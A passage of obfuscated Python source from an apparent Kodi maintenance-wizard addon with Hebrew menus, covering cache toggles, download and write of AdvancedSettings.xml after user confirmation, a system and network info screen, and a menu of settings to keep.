	if O0O0OOOOO00O0O000 =='true':#line:2906
		addFile ('--- Include All Video Addons: %s'%O0OOO000000O0O0OO .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Bob: %s'%O0O000O00000O0000 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Phoenix: %s'%OO0OOO0OO0000OOO0 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Specto: %s'%OOOOO0OOOOO0O0OOO .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Exodus: %s'%O00OO0O00O00O0O00 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Salts: %s'%O0OO00O000OOOO0O0 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Salts HD Lite: %s'%O0OOO0OOOO0O0OO0O .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include One Channel: %s'%O0OOOOOO000OOO00O .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Genesis: %s'%O0O0OO0000O0OO00O .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2917
	setView ('files','viewType')#line:2918
def advancedWindow (url =None ):#line:2920
	if not ADVANCEDFILE =='http://':#line:2921
		if url ==None :#line:2922
			O00OOO00000O0O0O0 =wiz .workingURL (ADVANCEDFILE )#line:2923
			O0OOOO0O00O0OOO0O =uservar .ADVANCEDFILE #line:2924
		else :#line:2925
			O00OOO00000O0O0O0 =wiz .workingURL (url )#line:2926
			O0OOOO0O00O0OOO0O =url #line:2927
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2928
		if os .path .exists (ADVANCED ):#line:2929
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2930
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if O00OOO00000O0O0O0 ==True :#line:2932
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			O00O0OO0O0OOO0OOO =wiz .openURL (O0OOOO0O00O0OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2934
			OO000OOO0O0OO00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0OO0O0OOO0OOO )#line:2935
			if len (OO000OOO0O0OO00OO )>0 :#line:2936
				for OO00OO0000O0O0O00 ,O0O0O000O00OO00OO ,url ,OO0O0O00O000OOO00 ,O0O0OO00O0OO0OOOO ,OO0OOOOOOO0O000OO in OO000OOO0O0OO00OO :#line:2937
					if O0O0O000O00OO00OO .lower ()=="yes":#line:2938
						addDir ("[B]%s[/B]"%OO00OO0000O0O0O00 ,'advancedsetting',url ,description =OO0OOOOOOO0O000OO ,icon =OO0O0O00O000OOO00 ,fanart =O0O0OO00O0OO0OOOO ,themeit =THEME3 )#line:2939
					else :#line:2940
						addFile (OO00OO0000O0O0O00 ,'writeadvanced',OO00OO0000O0O0O00 ,url ,description =OO0OOOOOOO0O000OO ,icon =OO0O0O00O000OOO00 ,fanart =O0O0OO00O0OO0OOOO ,themeit =THEME2 )#line:2941
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2942
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OOO00000O0O0O0 )#line:2943
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2944
def writeAdvanced (OOOO0OO0O0O0OO000 ,OOOO00OOO0O0OOOOO ):#line:2946
	O000000OOO0000OO0 =wiz .workingURL (OOOO00OOO0O0OOOOO )#line:2947
	if O000000OOO0000OO0 ==True :#line:2948
		if os .path .exists (ADVANCED ):OO0OOOOOOO00O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO0O0O0OO000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2949
		else :OO0OOOOOOO00O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO0O0O0OO000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2950
		if OO0OOOOOOO00O0000 ==1 :#line:2952
			O0O00O000O00O00O0 =wiz .openURL (OOOO00OOO0O0OOOOO )#line:2953
			OO00O0OO0OOO00OOO =open (ADVANCED ,'w');#line:2954
			OO00O0OO0OOO00OOO .write (O0O00O000O00O00O0 )#line:2955
			OO00O0OO0OOO00OOO .close ()#line:2956
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2957
			wiz .killxbmc (True )#line:2958
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2959
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O000000OOO0000OO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2960
def viewAdvanced ():#line:2962
	O000O00OOOO0OO0OO =open (ADVANCED )#line:2963
	OO000000O0O000OO0 =O000O00OOOO0OO0OO .read ().replace ('\t','    ')#line:2964
	wiz .TextBox (ADDONTITLE ,OO000000O0O000OO0 )#line:2965
	O000O00OOOO0OO0OO .close ()#line:2966
def removeAdvanced ():#line:2968
	if os .path .exists (ADVANCED ):#line:2969
		wiz .removeFile (ADVANCED )#line:2970
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2971
def showAutoAdvanced ():#line:2973
	notify .autoConfig ()#line:2974
def getIP ():#line:2976
	O0O000O0OOOO000OO ='http://whatismyipaddress.com/'#line:2977
	if not wiz .workingURL (O0O000O0OOOO000OO ):return 'Unknown','Unknown','Unknown'#line:2978
	O00O000000OO0OO0O =wiz .openURL (O0O000O0OOOO000OO ).replace ('\n','').replace ('\r','')#line:2979
	if not 'Access Denied'in O00O000000OO0OO0O :#line:2980
		O0O0O0O0OO0O0O000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00O000000OO0OO0O )#line:2981
		O000000OOO0O00OOO =O0O0O0O0OO0O0O000 [0 ]if (len (O0O0O0O0OO0O0O000 )>0 )else 'Unknown'#line:2982
		O0OO00OOOO00O000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00O000000OO0OO0O )#line:2983
		O00O0O0O0OO00O000 =O0OO00OOOO00O000O [0 ]if (len (O0OO00OOOO00O000O )>0 )else 'Unknown'#line:2984
		OO000O0OOOOOOOOOO =O0OO00OOOO00O000O [1 ]+', '+O0OO00OOOO00O000O [2 ]+', '+O0OO00OOOO00O000O [3 ]if (len (O0OO00OOOO00O000O )>2 )else 'Unknown'#line:2985
		return O000000OOO0O00OOO ,O00O0O0O0OO00O000 ,OO000O0OOOOOOOOOO #line:2986
	else :return 'Unknown','Unknown','Unknown'#line:2987
def systemInfo ():#line:2989
	OO0OO0OO0OOOO0O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3003
	O0O000000OOO00000 =[];O0OOOO000O0OOOO00 =0 #line:3004
	for O0O00OOOO000O0OO0 in OO0OO0OO0OOOO0O00 :#line:3005
		O0O0OOO0000O0O0O0 =wiz .getInfo (O0O00OOOO000O0OO0 )#line:3006
		OOO00000000OOOO0O =0 #line:3007
		while O0O0OOO0000O0O0O0 =="Busy"and OOO00000000OOOO0O <10 :#line:3008
			O0O0OOO0000O0O0O0 =wiz .getInfo (O0O00OOOO000O0OO0 );OOO00000000OOOO0O +=1 ;wiz .log ("%s sleep %s"%(O0O00OOOO000O0OO0 ,str (OOO00000000OOOO0O )));xbmc .sleep (1000 )#line:3009
		O0O000000OOO00000 .append (O0O0OOO0000O0O0O0 )#line:3010
		O0OOOO000O0OOOO00 +=1 #line:3011
	OOOOO0OO000O0OOO0 =O0O000000OOO00000 [8 ]if 'Una'in O0O000000OOO00000 [8 ]else wiz .convertSize (int (float (O0O000000OOO00000 [8 ][:-8 ]))*1024 *1024 )#line:3012
	O0O000000OOO0O000 =O0O000000OOO00000 [9 ]if 'Una'in O0O000000OOO00000 [9 ]else wiz .convertSize (int (float (O0O000000OOO00000 [9 ][:-8 ]))*1024 *1024 )#line:3013
	OOOOO000O0O0OO000 =O0O000000OOO00000 [10 ]if 'Una'in O0O000000OOO00000 [10 ]else wiz .convertSize (int (float (O0O000000OOO00000 [10 ][:-8 ]))*1024 *1024 )#line:3014
	O00O0O0OOOOOO0O0O =wiz .convertSize (int (float (O0O000000OOO00000 [11 ][:-2 ]))*1024 *1024 )#line:3015
	OOOOO00OO0O0OO0OO =wiz .convertSize (int (float (O0O000000OOO00000 [12 ][:-2 ]))*1024 *1024 )#line:3016
	O0O000O0OOO0000OO =wiz .convertSize (int (float (O0O000000OOO00000 [13 ][:-2 ]))*1024 *1024 )#line:3017
	O0O000O000000O00O ,OO0O00000O00OO0O0 ,OO000O00OOO00000O =getIP ()#line:3018
	O00OOO00O0OOO0OO0 =[];OO00O0OOO0000OO0O =[];OOO0O0OO0O000O00O =[];OO00OOOOOOOO0OO00 =[];OOO0OO00O000O00O0 =[];OOO0000O00OOOOO00 =[];O00000OO00OO0000O =[]#line:3020
	OOOOO0OO00O000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3022
	for OOOO0O00OOOOOO000 in sorted (OOOOO0OO00O000OO0 ,key =lambda OOOO0OO0OOOO0000O :OOOO0OO0OOOO0000O ):#line:3023
		O0O0O00000OO0OO0O =os .path .split (OOOO0O00OOOOOO000 [:-1 ])[1 ]#line:3024
		if O0O0O00000OO0OO0O =='packages':continue #line:3025
		OOOOOOO0O0OO0O000 =os .path .join (OOOO0O00OOOOOO000 ,'addon.xml')#line:3026
		if os .path .exists (OOOOOOO0O0OO0O000 ):#line:3027
			OOO0O000O000OOOOO =open (OOOOOOO0O0OO0O000 )#line:3028
			O0000000O00000O00 =OOO0O000O000OOOOO .read ()#line:3029
			OOO000OOOO00OO000 =re .compile ("<provides>(.+?)</provides>").findall (O0000000O00000O00 )#line:3030
			if len (OOO000OOOO00OO000 )==0 :#line:3031
				if O0O0O00000OO0OO0O .startswith ('skin'):O00000OO00OO0000O .append (O0O0O00000OO0OO0O )#line:3032
				if O0O0O00000OO0OO0O .startswith ('repo'):OOO0OO00O000O00O0 .append (O0O0O00000OO0OO0O )#line:3033
				else :OOO0000O00OOOOO00 .append (O0O0O00000OO0OO0O )#line:3034
			elif not (OOO000OOOO00OO000 [0 ]).find ('executable')==-1 :OO00OOOOOOOO0OO00 .append (O0O0O00000OO0OO0O )#line:3035
			elif not (OOO000OOOO00OO000 [0 ]).find ('video')==-1 :OOO0O0OO0O000O00O .append (O0O0O00000OO0OO0O )#line:3036
			elif not (OOO000OOOO00OO000 [0 ]).find ('audio')==-1 :OO00O0OOO0000OO0O .append (O0O0O00000OO0OO0O )#line:3037
			elif not (OOO000OOOO00OO000 [0 ]).find ('image')==-1 :O00OOO00O0OOO0OO0 .append (O0O0O00000OO0OO0O )#line:3038
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO000O0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO000O0O0OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0OOOOOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OO0O0OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O0OOO0000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O000000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00000O00OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00OOO00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO00000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	O0O0000OOOOO00000 =len (O00OOO00O0OOO0OO0 )+len (OO00O0OOO0000OO0O )+len (OOO0O0OO0O000O00O )+len (OO00OOOOOOOO0OO00 )+len (OOO0000O00OOOOO00 )+len (O00000OO00OO0000O )+len (OOO0OO00O000O00O0 )#line:3068
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O0000OOOOO00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O0OO0O000O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOOOOOOO0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0OOO0000OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO00O0OOO0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO00O000O00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000OO00OO0000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000O00OOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
def Menu ():#line:3077
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3078
def saveMenu ():#line:3080
	OO0O0OO000O00OOO0 ='[COLOR yellow]מופעל[/COLOR]';O0O0OO0O0O0OOO0OO ='[COLOR blue]מבוטל[/COLOR]'#line:3082
	OO0000OOOOOO0OO0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3083
	OOO0000OOOO0O0000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3084
	O0OO0000OOO0O0000 ='true'if KEEPINFO =='true'else 'false'#line:3085
	OO00OOOOOOOO000O0 ='true'if KEEPSOUND =='true'else 'false'#line:3087
	OO000OO0O0O00O0O0 ='true'if KEEPVIEW =='true'else 'false'#line:3088
	O0O0O0OOO0O000OO0 ='true'if KEEPSKIN =='true'else 'false'#line:3089
	O00O0OO00OOOOOO00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3090
	O0OOOO0OO00O0O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:3091
	OO0OO000OOO0O0O00 ='true'if KEEPADDONS =='true'else 'false'#line:3092
	O0OOO00O000O00OO0 ='true'if KEEPPVR =='true'else 'false'#line:3093
	O000O0OO0O0O0OO0O ='true'if KEEPTVLIST =='true'else 'false'#line:3094
	O0O00000OO0O0O00O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3095
	O0O0O00OO00OO000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3096
	O0000OOOOO00OO000 ='true'if KEEPHUBTV =='true'else 'false'#line:3097
	OOOO0O00O0O000000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3098
	OOO00000O0OOO0O00 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3099
	OOOO0O00O0000O000 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3100
	O0O0OOOO0OOOO0000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3101
	O00OOOOOO00OO00OO ='true'if KEEPHUBMENU =='true'else 'false'#line:3102
	O0OOOOOOOO0OOO000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3103
	O00OOOOOOO0OO0000 ='true'if KEEPTRAKT =='true'else 'false'#line:3104
	OOOOOOOO0OO0OO0OO ='true'if KEEPREAL =='true'else 'false'#line:3105
	OOOO0O0OOOOOOO0OO ='true'if KEEPRD2 =='true'else 'false'#line:3106
	OO0O000O00O0OOOO0 ='true'if KEEPTORNET =='true'else 'true'#line:3107
	OO00OOOOO000O0000 ='true'if KEEPLOGIN =='true'else 'false'#line:3108
	OOO00O0OOOOOO0O0O ='true'if KEEPSOURCES =='true'else 'false'#line:3109
	OOOOO0O0OO0000OOO ='true'if KEEPADVANCED =='true'else 'false'#line:3110
	O0O0O0O00OO0O0OOO ='true'if KEEPPROFILES =='true'else 'false'#line:3111
	O0OO000OO0O0OO0OO ='true'if KEEPFAVS =='true'else 'false'#line:3112
	OO0OOO0OOO00O0OO0 ='true'if KEEPREPOS =='true'else 'false'#line:3113
	O0O00O000O000OOO0 ='true'if KEEPSUPER =='true'else 'false'#line:3114
	OOO0O0OOOOO0000O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3115
	OOO0O00OO0O0OOO00 ='true'if KEEPWEATHER =='true'else 'false'#line:3116
	O0O000OOOO00OO000 ='true'if KEEPVICTORY =='true'else 'false'#line:3117
	OO00O0O0O0OOOO0O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3118
	if OOO0O0OOOOO0000O0 =='true':#line:3120
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3123
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת חשבון RD:  '%OOOOOOOO0OO0OO0OO .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון טראקט:  '%O00OOOOOOO0OO0000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת מועדפים:  '%O0OO000OO0O0OO0OO .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OOO00O000O00OO0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O000OOOO00OO000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טלמדיה:  '%OO00O0O0O0OOOO0O0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O000O0OO0O0O0OO0O .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח סרטים:  '%O0O00000OO0O0O00O .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח סדרות:  '%O0O0O00OO00OO000O .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח טלויזיה:  '%O0000OOOOO00OO000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOOO0O00O0O000000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח ספורט:  '%OOO00000O0OOO0O00 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח ילדים:  '%OOOO0O00O0000O000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח מוסיקה:  '%O0O0OOOO0OOOO0000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OOOOOO00OO00OO .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת כל האריחים בסקין:  '%O0O0O0OOO0O000OO0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO0O00OO0O0OOO00 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO0OO000OOO0O0O00 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OO0000OOO0O0000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO0000OOOO0O0000 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOO00O0OOOOOO0O0O .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO00OOOOOOOO000O0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO000OO0O0O00O0O0 .replace ('true',OO0O0OO000O00OOO0 ).replace ('false',O0O0OO0O0O0OOO0OO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
